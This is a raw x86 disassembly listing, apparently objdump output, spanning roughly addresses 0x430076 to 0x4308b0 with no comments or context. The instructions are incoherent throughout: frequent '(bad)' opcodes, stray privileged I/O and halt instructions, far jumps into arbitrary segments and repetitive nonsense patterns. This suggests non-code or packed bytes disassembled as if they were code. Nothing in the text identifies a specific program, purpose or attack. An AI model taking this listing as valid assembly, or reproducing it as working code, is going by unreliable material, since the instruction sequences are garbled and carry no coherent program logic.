  430076:	jne    0x43007a
  430078:	lock xchg si,ax
  43007b:	push   cs
  43007c:	jmp    0xb744b4ca
  430081:	add    cl,bh
  430083:	std    
  430084:	in     al,dx
  430085:	add    esi,DWORD PTR [ebp+0x77]
  430088:	jmp    0x4fa6fa8c
  43008d:	sub    al,0x1e
  43008f:	fs pop ecx
  430091:	add    edi,eax
  430093:	mov    ah,0xe6
  430095:	jge    0x430062
  430097:	test   BYTE PTR [eax],0x85
  43009a:	std    
  43009b:	cmc    
  43009c:	icebp  
  43009d:	cmp    BYTE PTR [ecx+0x3e902],0x0
  4300a4:	add    BYTE PTR [eax],al
  4300a6:	add    BYTE PTR [esi+0x7e],bh
  4300a9:	imul   eax,DWORD PTR [esi*2-0x1da499fe],0xdb4d6cf4
  4300b4:	arpl   ax,bp
  4300b6:	test   ch,bl
  4300b8:	stc    
  4300b9:	loope  0x430042
  4300bb:	mov    eax,0x2c03e8ff
  4300c0:	out    dx,al
  4300c1:	hlt    
  4300c2:	mov    edx,0x5307e6f
  4300c7:	jne    0x4300cb
  4300c9:	add    BYTE PTR [eax-0x7c179c56],ah
  4300cf:	stos   DWORD PTR es:[edi],eax
  4300d0:	and    dh,dl
  4300d2:	xchg   eax,esp
  4300d4:	(bad)  
  4300d5:	call   0x18aaf5dd
  4300da:	add    ecx,edi
  4300dc:	sub    al,0xe5
  4300de:	add    esi,DWORD PTR [ebp-0x7e]
  4300e1:	mov    ebp,0xb736e2a
  4300e6:	or     BYTE PTR [ebp+0x2],dh
  4300e9:	add    BYTE PTR [edx+0x34],ah
  4300ec:	sti    
  4300ed:	gs jmp 0x1401a968
  4300f3:	pop    ebx
  4300f4:	push   0x5af9ed71
  4300f9:	das    
  4300fa:	jo     0x430123
  4300fc:	jl     0x4300f5
  4300fe:	bound  esi,QWORD PTR [eax+0x7666145b]
  430104:	add    bh,bh
  430106:	or     BYTE PTR [ecx+0x17364c],0x0
  43010d:	add    BYTE PTR [eax],al
  43010f:	add    BYTE PTR [ebp-0x9],dh
  430112:	jge    0x4300f8
  430114:	jp     0x430118
  430116:	add    dh,bl
  430118:	pop    ds
  430119:	sub    al,0x7a
  43011b:	icebp  
  43011c:	jne    0x430102
  43011e:	cmc    
  43011f:	jmp    0xa359:0x26870276
  430126:	jle    0x430169
  430128:	test   eax,edi
  43012a:	or     DWORD PTR [ecx+edi*2+0x2],0x0
  43012f:	pusha  
  430130:	in     al,0xfa
  430132:	mov    BYTE PTR [edi-0x15a3a61e],cl
  430138:	jbe    0x43013c
  43013a:	cli    
  43013b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43013c:	jns    0x4301ba
  43013e:	dec    ecx
  43013f:	jmp    0x4fed:0xde0269f6
  430146:	cld    
  430147:	push   es
  430148:	inc    ebp
  430149:	clc    
  43014a:	mov    cl,0x18
  43014c:	pusha  
  43014d:	in     al,0xef
  43014f:	addr16 mov dh,0x62
  430152:	or     DWORD PTR [esi+ebx*2+0x66],esp
  430156:	cli    
  430157:	out    0xf1,al
  430159:	imul   eax,DWORD PTR [ecx],0xff30fdee
  43015f:	call   0xeb8441da
  430164:	pop    cx
  430166:	sub    al,0x0
  430168:	(bad)  
  430169:	(bad)  
  43016a:	inc    DWORD PTR [edx+0x4c6e6135]
  430170:	fucomip st,st(7)
  430172:	add    eax,0x74
  430177:	add    BYTE PTR [eax],al
  430179:	dec    ebx
  43017a:	test   DWORD PTR [edi-0x3103010],edi
  430180:	push   cs
  430181:	fidivr DWORD PTR [ecx-0x5]
  430184:	jmp    ebx
  430186:	push   0x164d46bd
  43018b:	add    cl,ch
  43018d:	inc    eax
  43018e:	add    eax,0x48b20000
  430193:	stc    
  430194:	mov    DWORD PTR [edx+0x5],edx
  430197:	cmp    cl,0x19
  43019a:	popa   
  43019b:	jge    0x430123
  43019d:	xchg   ecx,eax
  43019e:	icebp  
  43019f:	cmc    
  4301a0:	pminsw mm6,QWORD PTR [edi-0x1ee77dcc]
  4301a7:	cmp    al,BYTE PTR [eax]
  4301a9:	and    ecx,DWORD PTR [ebx-0xe4c0293]
  4301af:	jp     0x4301aa
  4301b1:	fsub   DWORD PTR [eax-0x7d]
  4301b4:	in     eax,0xde
  4301b6:	add    eax,0x41ac600
  4301bb:	or     ch,cl
  4301bd:	xor    BYTE PTR [eax+eax*1],al
  4301c0:	add    BYTE PTR [edx+0x48],dh
  4301c3:	stc    
  4301c4:	mov    DWORD PTR [edx],edx
  4301c6:	add    eax,0x60d6f980
  4301cb:	jge    0x430223
  4301cd:	jno    0x4301c0
  4301cf:	cmc    
  4301d0:	punpckhdq mm6,QWORD PTR [edi-0x205b7dcc]
  4301d7:	cmp    al,BYTE PTR [eax]
  4301d9:	ret    
  4301da:	mov    bh,BYTE PTR ds:0xfd
  4301e0:	add    BYTE PTR [eax],al
  4301e2:	xchg   ebx,eax
  4301e3:	lock jp 0x4301df
  4301e6:	test   DWORD PTR [eax-0x7d],esp
  4301e9:	mov    ch,0x75
  4301eb:	ins    DWORD PTR es:[edi],dx
  4301ec:	(bad)  
  4301ed:	(bad)  
  4301ee:	mov    ebx,0x8c10fe29
  4301f3:	ja     0x4301f5
  4301f5:	add    BYTE PTR [ebp-0x15],dh
  4301f8:	gs add eax,0xf288ee7a
  4301fe:	bound  esi,QWORD PTR [eax+0x6db3b1f9]
  430204:	jge    0x4301ed
  430206:	gs test eax,0xff8400c4
  43020c:	add    eax,0xb640c948
  430211:	or     dh,al
  430213:	(bad)  
  430214:	add    BYTE PTR [eax],al
  430216:	jne    0x430203
  430218:	cld    
  430219:	nop    edi
  43021c:	add    BYTE PTR [eax],al
  43021e:	jne    0x43020b
  430220:	cld    
  430221:	pop    es
  430222:	or     al,0x67
  430224:	add    BYTE PTR [eax],al
  430226:	jne    0x430213
  430228:	cld    
  430229:	add    ebx,DWORD PTR [edi+edi*1]
  43022c:	add    BYTE PTR [eax],al
  43022e:	jne    0x430259
  430230:	lds    eax,FWORD PTR [eax]
  430232:	dec    edx
  430233:	mov    dl,0xd5
  430235:	std    
  430236:	repnz push 0x75
  430239:	rcr    ebp,0xe7
  43023c:	pop    es
  43023d:	add    BYTE PTR [ebp-0x1a],dh
  430240:	ds jae 0x4301c9
  430243:	aad    0x4
  430245:	and    al,0x0
  430247:	add    BYTE PTR [eax],al
  430249:	add    BYTE PTR [eax],al
  43024b:	jbe    0x4302bd
  43024d:	mov    ah,0xbf
  43024f:	ret    0x612
  430252:	shl    dh,0xa
  430255:	outs   dx,BYTE PTR ds:[esi]
  430256:	jle    0x43020d
  430258:	cmp    DWORD PTR [ebp-0x2],edx
  43025b:	sub    edi,DWORD PTR [bx+0x3387]
  430260:	push   0x75
  430262:	jp     0x4302e1
  430264:	out    0x69,al
  430266:	or     dh,cl
  430268:	add    DWORD PTR ds:0x6e027502,esp
  43026e:	ds (bad) 
  430270:	cmp    BYTE PTR [ebx+0x44],ch
  430273:	outs   dx,DWORD PTR ds:[esi]
  430274:	xchg   BYTE PTR ds:0x6e607f77,al
  43027a:	mov    BYTE PTR [edi+0x76006226],0x69
  430281:	fdiv   QWORD PTR [esi+0x5f]
  430284:	pusha  
  430285:	push   0x6c0f7069
  43028a:	adc    al,BYTE PTR [esi+0x60]
  43028d:	cdq    
  43028e:	adc    esp,0xb475e906
  430294:	imul   DWORD PTR [eax-0x3]
  430297:	icebp  
  430298:	lods   al,BYTE PTR ds:[esi]
  430299:	out    0x3,al
  43029b:	jne    0x430229
  43029d:	fidivr DWORD PTR [ecx-0x15]
  4302a0:	inc    edx
  4302a1:	add    BYTE PTR [edx],0xcd
  4302a4:	and    dh,ah
  4302a6:	pop    ss
  4302a7:	int    0x1
  4302a9:	xacquire xchg BYTE PTR [edx+eax*1],al
  4302ad:	jmp    0x4302b5
  4302b2:	add    BYTE PTR [eax],al
  4302b4:	repnz enter 0x78e0,0xac
  4302b9:	push   cs
  4302ba:	pop    esi
  4302bb:	push   esp
  4302bc:	jae    0x4302ef
  4302be:	mov    ebx,0x5048fa10
  4302c3:	adc    dh,BYTE PTR [eax+0x2]
  4302c6:	jmp    0x531a2551
  4302cb:	test   BYTE PTR [ebx+0x13b5f203],bh
  4302d1:	ins    BYTE PTR es:[edi],dx
  4302d2:	and    WORD PTR [ebx+eax*4+0x9466d10],si
  4302da:	and    eax,esi
  4302dc:	jne    0x4302fc
  4302de:	adc    BYTE PTR [ecx],bh
  4302e0:	jne    0x4302e4
  4302e2:	jmp    0x46ce6a
  4302e7:	jge    0x43026d
  4302e9:	push   0xffffff99
  4302eb:	in     eax,0x76
  4302ed:	add    al,BYTE PTR [ebp-0x3df57557]
  4302f3:	daa    
  4302f4:	jbe    0x430313
  4302f6:	jmp    0x457a98
  4302fb:	bound  esi,QWORD PTR [eax]
  4302fd:	xlat   BYTE PTR ds:[bx]
  4302ff:	in     eax,dx
  430300:	jbe    0x430304
  430302:	test   DWORD PTR [ecx-0x49a87c97],ebp
  430308:	rcr    DWORD PTR [esi+ebp*1-0x57],1
  43030c:	repnz aaa 
  43030e:	or     bh,BYTE PTR [esi+esi*4-0x39]
  430312:	jle    0x43029d
  430314:	dec    ebx
  430315:	loopne 0x4302d6
  430317:	in     eax,dx
  430318:	add    BYTE PTR [eax],al
  43031a:	add    BYTE PTR [eax],al
  43031c:	add    BYTE PTR [edi-0x36710539],bl
  430322:	loopne 0x43039f
  430324:	int    0x7e
  430326:	add    dh,BYTE PTR [ebp-0xf]
  430329:	lods   eax,DWORD PTR ds:[esi]
  43032a:	ret    
  43032b:	and    ebx,ecx
  43032d:	lahf   
  43032e:	ret    
  43032f:	and    edx,ecx
  430331:	popf   
  430332:	ret    
  430333:	and    ecx,DWORD PTR ds:0x54389d1
  430339:	popa   
  43033a:	imul   esi,DWORD PTR [eax+ebp*8+0x76],0xb5970b02
  430342:	test   DWORD PTR [edi+0x19],edi
  430345:	xor    DWORD PTR [edi],ebx
  430347:	add    ch,bh
  430349:	pop    ecx
  43034a:	or     al,0x84
  43034c:	mov    ds:0xde000274,al
  430351:	or     BYTE PTR [edi+0x6b87098],bl
  430357:	mov    DWORD PTR [edi-0x17bebf36],esi
  43035d:	mov    ch,BYTE PTR [ecx+0x50]
  430360:	call   0xc305db
  430365:	ja     0x4303c7
  430367:	jae    0x430372
  430369:	push   edx
  43036a:	inc    ebp
  43036b:	push   DWORD PTR ds:0xffff4275
  430371:	mov    WORD PTR [ebp-0x50],ds
  430374:	ret    
  430375:	push   es
  430376:	jbe    0x430342
  430378:	dec    edi
  430379:	pop    esp
  43037a:	push   es
  43037b:	cmp    dl,0xab
  43037e:	push   eax
  43037f:	or     eax,0x80
  430384:	add    BYTE PTR [eax],al
  430386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430387:	cs je  0x430393
  43038a:	fsub   st(5),st
  43038c:	sbb    cl,BYTE PTR [edi]
  43038e:	rcr    DWORD PTR [eax-0x4],1
  430391:	dec    DWORD PTR [esp+eax*8+0x40]
  430395:	add    DWORD PTR [ecx-0x41],esp
  430398:	sbb    BYTE PTR [ecx],al
  43039a:	pop    esp
  43039b:	add    al,BYTE PTR [ebx+0x40dd587e]
  4303a1:	or     bh,dl
  4303a3:	sbb    DWORD PTR [esi],eax
  4303a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4303a6:	or     eax,0x20e0c103
  4303ab:	fst    st(2)
  4303ad:	punpckhdq mm0,mm4
  4303b0:	xchg   edi,eax
  4303b1:	add    eax,DWORD PTR [esi+esi*8]
  4303b4:	sar    DWORD PTR [ebx],0xfb
  4303b7:	pop    ecx
  4303b8:	jl     0x43033c
  4303ba:	sbb    eax,0x5770002
  4303bf:	sub    eax,0x881b0856
  4303c4:	ins    DWORD PTR es:[edi],dx
  4303c5:	add    DWORD PTR [edx+eax*1],ecx
  4303c8:	add    ebx,0x7f
  4303cb:	(bad)  
  4303cc:	jns    0x4303c6
  4303ce:	stos   DWORD PTR es:[edi],eax
  4303cf:	pop    ecx
  4303d0:	jle    0x43043c
  4303d2:	int    0x1
  4303d4:	add    BYTE PTR [ecx+0x4e8759ea],cl
  4303da:	enter  0xd4be,0x0
  4303de:	fadd   QWORD PTR [ecx]
  4303e0:	cmp    bl,0x75
  4303e3:	data16 cmc 
  4303e5:	test   BYTE PTR [ebx+ebp*2+0xfffe],ah
  4303ec:	add    BYTE PTR [eax],al
  4303ee:	add    BYTE PTR [esi+0x7ff683e8],bl
  4303f4:	ins    BYTE PTR es:[edi],dx
  4303f5:	jg     0x4303b3
  4303f7:	test   al,0x54
  4303f9:	xchg   BYTE PTR gs:[ebx],dh
  4303fc:	arpl   WORD PTR [ecx-0x694869f],ax
  430402:	inc    ecx
  430403:	jns    0x4303bb
  430405:	sti    
  430406:	jg     0x43047b
  430408:	or     ebx,DWORD PTR [ebp-0x6a]
  43040b:	or     BYTE PTR [ebp+eiz*2-0x3f],0xbb
  430410:	push   0x2b
  430412:	jmp    0x416f33
  430417:	out    dx,al
  430418:	sub    eax,0x7d986f8
  43041d:	adc    al,0x87
  43041f:	ret    
  430420:	push   edi
  430421:	jns    0x43047c
  430423:	jge    0x430455
  430425:	cmp    eax,0x8b5bb9fe
  43042a:	ss das 
  43042c:	hlt    
  43042d:	stc    
  43042e:	ins    DWORD PTR es:[edi],dx
  43042f:	jns    0x430471
  430431:	inc    esi
  430432:	outs   dx,BYTE PTR ds:[esi]
  430433:	jno    0x430405
  430435:	inc    ecx
  430436:	xchg   BYTE PTR [eax+ebp*8-0x1e],al
  43043a:	and    edi,DWORD PTR [ebp+0x6b]
  43043d:	out    dx,eax
  43043e:	add    edi,esp
  430440:	data16 sbb bl,BYTE PTR [eax]
  430443:	pop    esi
  430444:	ret    
  430445:	ja     0x43048a
  430447:	jp     0x4303fd
  430449:	jnp    0x43048e
  43044b:	push   ecx
  43044c:	pop    ebx
  43044d:	or     esi,eax
  43044f:	(bad)  
  430450:	daa    
  430451:	cli    
  430452:	rol    BYTE PTR [eax],0x0
  430455:	add    BYTE PTR [eax],al
  430457:	add    ah,bh
  430459:	jl     0x430451
  43045b:	mov    BYTE PTR [ebx],dh
  43045d:	addr16 out dx,eax
  43045f:	fs mov bl,0xa4
  430462:	add    esi,DWORD PTR [esi]
  430464:	fiadd  WORD PTR [ecx]
  430466:	ret    0xc383
  430469:	push   cs
  43046a:	jmp    0x3b6a:0x11573180
  430471:	faddp  st(4),st
  430473:	or     esi,DWORD PTR [ebp+0x44]
  430476:	stos   BYTE PTR es:[edi],al
  430477:	add    al,0x62
  430479:	(bad)  
  43047a:	lods   eax,DWORD PTR ds:[esi]
  43047b:	jle    0x43049c
  43047d:	imul   BYTE PTR [ebx+0x6a]
  430480:	es cs pop esi
  430483:	iret   
  430484:	push   esi
  430485:	cli    
  430486:	ins    DWORD PTR es:[edi],dx
  430487:	rcl    BYTE PTR [esi-0xe],0xd
  43048b:	inc    esi
  43048c:	xor    cl,BYTE PTR [ecx-0x7958965e]
  430492:	test   al,0xf0
  430494:	js     0x43041e
  430496:	sub    dl,BYTE PTR [ecx]
  430498:	xchg   ecx,eax
  430499:	test   ah,ch
  43049b:	add    ebp,ebp
  43049d:	(bad)  
  43049e:	fnstcw WORD PTR [ebp-0x4c]
  4304a1:	repz add al,0xe9
  4304a4:	cli    
  4304a5:	(bad)  
  4304a6:	int3   
  4304a7:	clc    
  4304a8:	jg     0x43042f
  4304aa:	(bad)  
  4304ab:	je     0x4304ec
  4304ad:	pop    esp
  4304ae:	gs loopne 0x430447
  4304b1:	cli    
  4304b2:	call   0x7dc58a13
  4304b7:	(bad)  
  4304b8:	jg     0x43043f
  4304ba:	jns    0x43052c
  4304bc:	add    BYTE PTR [eax],al
  4304be:	add    BYTE PTR [eax],al
  4304c0:	add    BYTE PTR [edi],bl
  4304c2:	pop    esp
  4304c3:	gs loop 0x43053c
  4304c6:	add    ah,BYTE PTR [ebx+0x620f75c2]
  4304cc:	rcl    BYTE PTR [esi-0xe],0x6d
  4304d0:	rcl    BYTE PTR [esi-0xe],0x5d
  4304d4:	ins    BYTE PTR es:[edi],dx
  4304d5:	inc    ebx
  4304d6:	mov    BYTE PTR [eax+eiz*1],0x7e
  4304da:	test   DWORD PTR [esp+esi*2-0x11],ebx
  4304de:	pop    ebx
  4304df:	ins    DWORD PTR es:[edi],dx
  4304e0:	(bad)  
  4304e1:	jp     0x430562
  4304e3:	push   DWORD PTR [edx+edi*2+0x52ddfffe]
  4304ea:	push   0xffffffff
  4304ec:	call   0xf1818867
  4304f1:	inc    ebx
  4304f2:	fwait
  4304f3:	or     ch,BYTE PTR [ebp+0x2f]
  4304f6:	pop    ebx
  4304f7:	cli    
  4304f8:	jmp    0xe566b42e
  4304fd:	sub    DWORD PTR [eax+0x26],ecx
  430500:	lods   eax,DWORD PTR ds:[esi]
  430501:	cmp    dh,0x50
  430504:	bound  ebx,QWORD PTR [edi+0x58]
  430507:	iret   
  430508:	fs cmp edi,ecx
  43050b:	add    eax,0x23f0b473
  430510:	push   0xffffff8a
  430512:	pop    esp
  430513:	sub    BYTE PTR [edi],0x64
  430516:	push   eax
  430517:	inc    ecx
  430518:	neg    BYTE PTR [ebp+0x8]
  43051b:	test   BYTE PTR [esi+0x76],bh
  43051e:	add    al,BYTE PTR [eax]
  430520:	jb     0x4304d7
  430522:	push   0xffffff99
  430524:	mov    eax,0x0
  430529:	add    ch,cl
  43052b:	pop    eax
  43052c:	test   DWORD PTR [edi],esp
  43052e:	fs es mov ebp,esi
  430532:	dec    edi
  430533:	push   0xffffff8f
  430535:	jmp    0x2fc907b0
  43053a:	fs es cwde 
  43053d:	fnstsw WORD PTR [esi+0x69]
  430540:	sub    ecx,0x76
  430543:	add    al,BYTE PTR [esi-0x72d97bd9]
  430549:	in     eax,0x23
  43054b:	fs jbe 0x4305b1
  43054e:	xor    al,0xf0
  430550:	and    edi,DWORD PTR [edx+eax*1-0xa]
  430554:	out    0xdb,al
  430556:	add    cl,0x12
  430559:	or     eax,0x421206e7
  43055e:	iret   
  43055f:	test   BYTE PTR [ecx+0x0],al
  430562:	retf   
  430563:	cli    
  430564:	test   BYTE PTR [ecx+ebx*8],cl
  430567:	(bad)  
  430568:	inc    eax
  430569:	pop    ss
  43056a:	xor    eax,0xa3ffef47
  43056f:	faddp  st(0),st
  430571:	call   0x430ad1
  430576:	pop    ecx
  430577:	mov    edi,0x156136e
  43057c:	and    al,0x3
  43057e:	rcl    DWORD PTR [eax+0xe54f7ba],cl
  430584:	rol    BYTE PTR [ebx-0x3f862994],0xbd
  43058b:	mov    ebp,0x32f9
  430590:	add    BYTE PTR [eax],al
  430592:	add    BYTE PTR [edi+edi*1-0x7e],bl
  430596:	inc    esi
  430597:	popf   
  430598:	xlat   BYTE PTR ds:[ebx]
  430599:	jne    0x4305b3
  43059b:	sbb    ebx,esp
  43059d:	add    eax,0xf5d05a84
  4305a2:	call   edi
  4305a4:	adc    dh,dh
  4305a6:	xlat   BYTE PTR ds:[ebx]
  4305a7:	fnstcw WORD PTR [esi-0x2b797bfb]
  4305ad:	cmc    
  4305ae:	call   esi
  4305b0:	cwde   
  4305b1:	or     eax,0xfd5adb24
  4305b6:	xchg   DWORD PTR [edx-0x21e416f7],ebx
  4305bc:	loope  0x4305b3
  4305be:	mov    cl,BYTE PTR [edx+0x50972409]
  4305c4:	or     ebx,esp
  4305c6:	pop    es
  4305c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4305c8:	cwde   
  4305c9:	or     eax,0x175a9524
  4305ce:	mov    BYTE PTR [edx+0x9],cl
  4305d1:	add    BYTE PTR [esi+0x2b],0x7e
  4305d5:	jne    0x4305e6
  4305d7:	cdq    
  4305d8:	into   
  4305d9:	jmp    0x750c:0x9c22a3ff
  4305e0:	dec    edi
  4305e1:	push   ebp
  4305e2:	test   esi,esi
  4305e4:	inc    edi
  4305e5:	sbb    dl,BYTE PTR [esi*2+0x36871497]
  4305ec:	addr16 jg 0x4305ae
  4305ef:	popa   
  4305f0:	or     BYTE PTR [edi+0x53],dh
  4305f3:	cdq    
  4305f4:	das    
  4305f5:	jne    0x4305c1
  4305f7:	add    BYTE PTR [eax],al
  4305f9:	add    BYTE PTR [eax],al
  4305fb:	add    BYTE PTR [esi+0x24141a8f],bl
  430601:	aam    0x31
  430603:	cli    
  430604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430605:	out    0x43,al
  430607:	jae    0x430688
  430609:	in     eax,0xb9
  43060b:	adc    dl,BYTE PTR [ecx-0x19]
  43060e:	test   DWORD PTR [ebx],0xf209a1ed
  430614:	xor    edi,DWORD PTR [eax]
  430616:	loope  0x430622
  430618:	clc    
  430619:	das    
  43061a:	popa   
  43061b:	cli    
  43061c:	mov    ch,ah
  43061e:	loop   0x430643
  430620:	push   ebp
  430621:	imul   ebp,edx,0x29
  430624:	out    dx,al
  430625:	sub    al,0x0
  430627:	test   DWORD PTR ds:0xc1871aaf,esi
  43062d:	pop    es
  43062e:	and    al,0x87
  430630:	xor    dh,ah
  430632:	mov    bh,0x23
  430634:	xchg   ebp,eax
  430635:	cli    
  430636:	jbe    0x430601
  430638:	push   edx
  430639:	jnp    0x4306ba
  43063b:	mov    edi,0x417855c1
  430640:	push   0x3f
  430642:	or     BYTE PTR [ebx],0x77
  430645:	jecxz  0x430603
  430647:	adc    ch,BYTE PTR [ebx]
  430649:	and    DWORD PTR [ebx],ecx
  43064b:	jnp    0x4306c7
  43064d:	out    0x41,al
  43064f:	stc    
  430650:	and    bl,al
  430652:	jge    0x4306cf
  430654:	push   ecx
  430655:	xor    edi,esi
  430657:	jae    0x4306ba
  430659:	in     al,0xbd
  43065b:	adc    esi,eax
  43065d:	add    DWORD PTR [ecx],ebp
  43065f:	out    dx,eax
  430660:	add    BYTE PTR [eax],al
  430662:	add    BYTE PTR [eax],al
  430664:	add    BYTE PTR [ecx-0x73],bl
  430667:	mov    ah,0x1f
  430669:	pop    ebp
  43066a:	lea    esp,[ecx]
  43066c:	sbb    bh,BYTE PTR [ebx-0x10caa24e]
  430672:	xor    DWORD PTR [ebx+0x43],ebp
  430675:	data16 or al,0x6f
  430678:	mov    ebp,0xf76b1e87
  43067d:	je     0x430609
  43067f:	mov    ds:0xf9bfc70e,al
  430684:	out    0x6f,al
  430686:	jg     0x4306d4
  430688:	gs mov edi,0x82c05d58
  43068e:	mov    ecx,0x5ef3caaa
  430693:	mov    ds:0x59026e41,eax
  430698:	clc    
  430699:	mov    dl,0xc3
  43069b:	call   0xe906bdd3
  4306a0:	fidiv  WORD PTR [edx-0x456f173d]
  4306a6:	ret    
  4306a7:	call   0xe906b955
  4306ac:	aaa    
  4306ad:	cmp    al,ch
  4306af:	call   0xe90838f9
  4306b4:	jae    0x4306f0
  4306b6:	(bad)
  4306b9:	sub    al,0xc5
  4306bb:	call   0xe90842c5
  4306c0:	fdivr  QWORD PTR ds:0x2d80e8c5
  4306c6:	(bad)
  4306c9:	add    BYTE PTR [eax],al
  4306cb:	add    BYTE PTR [eax],al
  4306cd:	add    BYTE PTR ds:0x3d5ee8c5,ch
  4306d3:	(bad)
  4306d6:	xor    eax,ebp
  4306d8:	call   0xe9083f96
  4306dd:	enter  0xc530,0xff
  4306e1:	call   0xe9804654
  4306e6:	or     BYTE PTR [ebx+0x3d],0xe9
  4306ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4306eb:	dec    ebx
  4306ec:	cmp    eax,0x3d4ba6e9
  4306f1:	jmp    0xe980523c
  4306f6:	inc    esi
  4306f7:	dec    ebx
  4306f8:	cmp    eax,0x3d4b46e9
  4306fd:	jmp    0xe9805248
  430702:	push   edi
  430703:	dec    ebx
  430704:	cmp    eax,0x3d4b57e9
  430709:	jmp    0xe9805234
  43070e:	push   edi
  43070f:	dec    ebx
  430710:	cmp    eax,0x3d4b17e9
  430715:	jmp    0xe9805231
  43071a:	pop    ss
  43071b:	dec    ebx
  43071c:	cmp    eax,0x3d4b17e9
  430721:	jmp    0xe980523d
  430726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430727:	inc    esi
  430728:	cmp    eax,0x3d46a8e9
  43072d:	jmp    0xe9804e28
  430732:	add    BYTE PTR [eax],al
  430734:	add    BYTE PTR [eax],al
  430736:	add    BYTE PTR [esi+eax*2],al
  430739:	cmp    eax,0x3d460ae9
  43073e:	jmp    0xe9804d53
  430743:	test   al,0x46
  430745:	cmp    eax,0x3d46aee9
  43074a:	jmp    0xe980509d
  43074f:	bound  ecx,QWORD PTR [ebp+edi*1-0x17]
  430753:	push   esp
  430754:	inc    ecx
  430755:	cmp    eax,0x3d4911e9
  43075a:	jmp    0x804ea3
  43075f:	or     al,0x69
  430761:	rol    BYTE PTR [edx+0xc],0xc7
  430765:	rol    BYTE PTR [edx+0x1c],0x6f
  430769:	int3   
  43076a:	inc    edx
  43076b:	sbb    al,0xe2
  43076d:	leave  
  43076e:	inc    edx
  43076f:	or     al,0x56
  430771:	into   
  430772:	inc    edx
  430773:	or     al,0x5d
  430775:	into   
  430776:	inc    edx
  430777:	(bad)  
  430779:	into   
  43077a:	inc    edx
  43077b:	fsubr  QWORD PTR [ebp+0x26cc42c0]
  430781:	retf   
  430782:	inc    edx
  430783:	int3   
  430784:	ins    DWORD PTR es:[edi],dx
  430785:	into   
  430786:	inc    edx
  430787:	fsub   st(3),st
  430789:	into   
  43078a:	inc    edx
  43078b:	fcom   QWORD PTR [ebp+0x4bcc42d3]
  430791:	mov    ebp,0xca14cc42
  430796:	inc    edx
  430797:	pushf  
  430798:	scas   eax,DWORD PTR es:[edi]
  430799:	int3   
  43079a:	inc    edx
  43079b:	add    BYTE PTR [eax],al
  43079d:	add    BYTE PTR [eax],al
  43079f:	add    BYTE PTR [edi+ecx*1-0x4373bd37],bl
  4307a6:	enter  0x8c42,0xad
  4307aa:	enter  0x9c42,0x4f
  4307ae:	lds    eax,FWORD PTR [edx-0x64]
  4307b1:	pop    ds
  4307b2:	mov    DWORD PTR [edx-0x74],0x8c42c562
  4307b9:	mov    al,ch
  4307bb:	inc    edx
  4307bc:	pop    esp
  4307bd:	jb     0x430784
  4307bf:	inc    edx
  4307c0:	pop    esp
  4307c1:	sbb    al,dh
  4307c3:	inc    edx
  4307c4:	dec    esp
  4307c5:	sbb    al,dh
  4307c7:	inc    edx
  4307c8:	dec    esp
  4307c9:	sbb    al,dh
  4307cb:	inc    edx
  4307cc:	pop    esp
  4307cd:	sbb    al,dh
  4307cf:	inc    edx
  4307d0:	pop    esp
  4307d1:	lea    eax,[esi+ebx*1+0x73f9bde2]
  4307d8:	mov    ?,ecx
  4307da:	scas   al,BYTE PTR es:[edi]
  4307db:	dec    esi
  4307dc:	jne    0x430835
  4307de:	mov    ch,0x86
  4307e0:	xor    al,0x2
  4307e2:	call   0x5f17ca7f
  4307e7:	pop    edx
  4307e8:	test   BYTE PTR [ebx+0x13627404],0x50
  4307ef:	dec    DWORD PTR [edx]
  4307f1:	ins    BYTE PTR es:[edi],dx
  4307f2:	call   0x277b352d
  4307f7:	jg     0x43082e
  4307f9:	inc    eax
  4307fa:	call   0xff7ac535
  4307ff:	test   DWORD PTR [esi+0xfd6c2b],esi
  430805:	add    BYTE PTR [eax],al
  430807:	add    BYTE PTR [eax],al
  430809:	sbb    cl,BYTE PTR [ecx+ebx*8]
  43080c:	adc    ecx,DWORD PTR ds:0xfe0fd76b
  430812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430813:	push   es
  430814:	pop    ds
  430815:	xor    esi,DWORD PTR [edi]
  430817:	xor    edi,0x2f0776c2
  43081d:	mov    ch,0xab
  43081f:	mov    ecx,0xbb2b66be
  430824:	mov    esi,0x6153e043
  430829:	idiv   BYTE PTR [ebp-0x12]
  43082c:	jmp    DWORD PTR [eax]
  43082e:	cmp    ebp,eax
  430830:	jle    0x430845
  430832:	cmp    esi,edi
  430834:	jno    0x4308b2
  430836:	dec    ebp
  430837:	or     BYTE PTR [eax],dl
  430839:	or     DWORD PTR [edx+0x11],edx
  43083c:	rcr    BYTE PTR [ebx],0xa8
  43083f:	pop    eax
  430840:	add    DWORD PTR [ebp-0x49],edi
  430843:	push   esi
  430844:	out    0xfb,eax
  430846:	inc    ebx
  430847:	pop    ebp
  430848:	cli    
  430849:	push   0xffffffa3
  43084b:	stc    
  43084c:	mov    edi,0x5242f5b5
  430851:	dec    BYTE PTR [esp+edi*8]
  430854:	gs xchg ebp,eax
  430856:	rol    DWORD PTR [ebx],0x52
  430859:	inc    edx
  43085a:	add    bh,ah
  43085c:	ret    
  43085d:	fs ret 0x8de8
  430861:	je     0x430873
  430863:	sub    eax,0xa4818128
  430868:	mulps  xmm0,XMMWORD PTR [ecx]
  43086b:	mov    ecx,0x9
  430870:	add    BYTE PTR [eax],al
  430872:	call   0xf28b:0x750bc4d6
  430879:	sti    
  43087a:	scas   eax,DWORD PTR es:[edi]
  43087b:	iret   
  43087c:	jecxz  0x43086b
  43087e:	gs mov edx,0x424a114d
  430884:	fist   WORD PTR gs:[esi+0x112e7fe]
  43088b:	inc    edx
  43088c:	pop    ebx
  43088d:	(bad)  
  43088e:	loop   0x430892
  430890:	imul   ebp,ecx,0xc9708287
  430896:	jne    0x4308d8
  430898:	in     al,dx
  430899:	add    esi,ebx
  43089b:	ret    0x8dd1
  43089e:	mov    dl,0x81
  4308a0:	push   es
  4308a1:	loop   0x4308e9
  4308a3:	jmp    FWORD PTR [eax+0x5d]
  4308a6:	mov    ecx,edi
  4308a8:	stc    
  4308a9:	xchg   BYTE PTR [esi],ch
  4308ab:	push   ds
  4308ac:	in     eax,0x3
  4308ae:	outs   dx,BYTE PTR ds:[esi]
  4308af:	outs   dx,BYTE PTR ds:[esi]
  4308b0:	es popa 
